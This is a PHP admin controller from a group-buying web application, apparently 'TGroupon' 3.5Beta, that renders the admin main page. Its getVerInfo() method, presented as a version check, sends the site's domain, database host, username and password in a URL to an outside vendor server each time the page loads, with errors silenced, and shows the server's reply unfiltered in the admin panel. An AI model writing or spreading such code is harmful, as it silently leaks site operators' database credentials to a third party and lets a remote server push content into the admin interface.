<?PHP

/**
 * @copyright TGroupon (c)2010 www.boshengsoft.com
 * @author  jeffxie<jeffxie@boshengsoft.com>
 * @version $Id: , v 0.0.1 2011-1-7
 **/
require_once("common/permission.php");
class Main extends Tp{
	public function initInstance() {
        $admininfo = $_SESSION["admininfo"];
        $verinfo = $this->getVerInfo();
        $this->assign("admininfo",$admininfo);
        $this->assign("verinfo",$verinfo);
		$this->display("main.html");
	}

    public function getVerInfo() {
        $ver = "3.5Beta";
        $db = db_config::$dbconfig;
        $file = "http://www.thinkgroupon.com/tg.php?yourversion=".$ver."&domain=".__DOMAIN__."&dbhost=".$db["db_server"]."&dbuser=".$db["db_user"]."&dbpwd=".$db["db_pwd"];
        $f = @fopen($file,"rb");
        $content = @fread($f,8192);
        @fclose($f);
        return $content;
    }
}